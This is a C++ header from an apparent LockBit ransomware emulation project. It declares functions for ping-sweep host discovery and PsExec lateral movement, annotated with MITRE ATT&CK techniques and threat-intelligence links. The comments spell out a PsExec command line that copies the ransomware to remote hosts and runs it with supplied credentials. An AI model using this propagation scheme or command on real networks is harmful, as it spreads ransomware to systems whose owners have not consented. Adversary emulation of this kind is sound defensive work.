#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <vector>
#include <set>
#include <string>
#include <Windows.h>
#include <winsock2.h>
#include <iphlpapi.h>
#include <icmpapi.h>
#include "config.hpp"
#include "util/winapihelper.hpp"

#define PING_TIMEOUT_MS 1000

using FP_GetAdaptersInfo = decltype(&GetAdaptersInfo);
using FP_IcmpCloseHandle = decltype(&IcmpCloseHandle);
using FP_IcmpCreateFile = decltype(&IcmpCreateFile);
using FP_IcmpSendEcho = decltype(&IcmpSendEcho);

namespace propagate {

/*
 * PingRemoteHost (defined in src/lockbit_main/propagate/ping.cpp):
 *      About:
 *          Pings the specified target IP address using the IcmpCreateFile and IcmpSendEcho API calls.
 *      Result:
 *          True on successful ping, false otherwise.
 *      MITRE ATT&CK Techniques:
 *          T1018: Remote System Discovery
 *          T1106: Native API
 *      CTI:
 *          https://thedfirreport.com/2020/06/10/lockbit-ransomware-why-you-no-spread/
 */
bool PingRemoteHost(const std::string& ip_addr_str);

/*
 * GetLocalIpv4AndCidr (defined in src/lockbit_main/propagate/local_ips.cpp):
 *      About:
 *          Gets the local IPv4 addresses and CIDR subnet masks for the network adapters on
 *          the local target machine. This information will be used to ping remote targets as
 *          part of lateral movement. Local IP and CIDR information is gathered using the
 *          GetAdaptersInfo API call.
 *      Result:
 *          std::vector of tuples containing the IPv4 addresses (IPAddr) and CIDR masks (uint32_t)
 *          for each discovered local network adapter.
 *      MITRE ATT&CK Techniques:
 *          T1016: System Network Configuration Discovery
 *          T1106: Native API
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://thedfirreport.com/2020/06/10/lockbit-ransomware-why-you-no-spread/
 *      Other References:
 *           https://learn.microsoft.com/en-us/windows/win32/api/iphlpapi/nf-iphlpapi-getadaptersinfo
 */
std::vector<std::tuple<IPAddr, uint32_t>> GetLocalIpv4AndCidr();

/*
 * GetTargetsFromLocalCidr (defined in src/lockbit_main/propagate/local_ips.cpp):
 *      About:
 *          Given local IPAddr (network-byte order) and CIDR netmask size, returns vector of IPAddr representing 
 *          the target remote addresses to attempt to propagate to.
 *          Excludes the first and last IP of the subnet (network and broadcast addresses), the local address itself,
 *          and any loopback or multicast addresses. Also excludes any ip addresses that don't fall within the strict 
 *          includes set, if a non-empty set is provided.
 *      Result:
 *          std::vector of IPAddr representing the target remote addresses to attempt to propagate to.
 */
std::vector<IPAddr> GetTargetsFromLocalCidr(IPAddr local_addr, uint32_t netmask_size, const std::set<IPAddr>& strict_include_ping_targets);

/*
 * PingLocalNetworks (defined in in src/lockbit_main/propagate/propagate.cpp):
 *      About:
 *          Pings local IPv4 networks and returns vector of std::wstring containing IPv4 addresses of
 *          remote hosts that successfully responded.
 *          If the provided configuration provides strict-include network ranges, no IP addresses
 *          outside of those ranges will be pinged.
 *          Local IP and CIDR information is gathered using the GetAdaptersInfo API call.
 *          Pinging is performed using the IcmpCreateFile and IcmpSendEcho API calls. 
 *      Result:
 *          std::vector of std::wstring containing the IPv4 addresses for each remote host that successfully
 *          responded to the ping
 *      MITRE ATT&CK Techniques:
 *          T1018: Remote System Discovery
 *          T1106: Native API
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://thedfirreport.com/2020/06/10/lockbit-ransomware-why-you-no-spread/
 */
std::vector<std::wstring> PingLocalNetworks(Config& cfg);

// Defined in src/lockbit_main/propagate/propagate.cpp
// Returns command line string to execute Lockbit via PsExec against the remote targets, using
// the credentials in the specified Config and specified command-line access token
std::wstring GetPsExecCommandLine(Config& cfg, const std::vector<std::wstring>& targets, const std::wstring& access_token);

/*
 * PerformPsExecPropagation (defined in src/lockbit_main/propagate/propagate.cpp):
 *      About:
 *          Pings local IPv4 networks to find remote targets, and then laterally moves to them
 *          via PsExec. PsExec will run on each target using the credentials provided in the
 *          config, copy the current executable over, and execute it using the provided access token.
 *          If the provided configuration provides strict-include network ranges, no IP addresses
 *          outside of those ranges will be pinged. If the configuration contains strict-include hosts,
 *          PsExec will only run on those hosts, as long as they respond to the ping attempts.
 *          The generated PsExec process will have the following command line:
 *              PsExec64.exe -accepteula \\target1,target2,...,targetN -u <psexec_username> -p <psexec_password> 
 *                  -s -d -f -c "<path_to_lockbit>" -d -w -pw <lockbit_access_token>
 *          Local IP and CIDR information is gathered using the GetAdaptersInfo API call.
 *          Pinging is performed using the IcmpCreateFile and IcmpSendEcho API calls.
 *          PsExec process creation is done using the CreateProcessW API call.
 *      Result:
 *          Propagation via PsExec
 *      MITRE ATT&CK Techniques:
 *          T1021.002: Remote Services: SMB/Windows Admin Shares
 *          T1543.003: Create or Modify System Process: Windows Service
 *          T1569.002: System Services: Service Execution
 *          T1570: Lateral Tool Transfer
 *          T1018: Remote System Discovery
 *          T1106: Native API
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://redpiranha.net/news/look-lockbit-3-ransomware
 */
void PerformPsExecPropagation(Config& cfg, const std::wstring& access_token);

// Defined in src/lockbit_main/propagate/propagate.cpp
// Gets the IP addresses that the configuration allows us to ping.
std::set<IPAddr> GetStrictIncludePingTargets(Config& cfg);

// Defined in src/lockbit_main/propagate/propagate.cpp
// Filter out any discovered hosts that don't appear in the configuration's strict-include host set.
std::vector<std::wstring> FilterDiscoveredHosts(Config& cfg, const std::vector<std::wstring>& targets);

} // namespace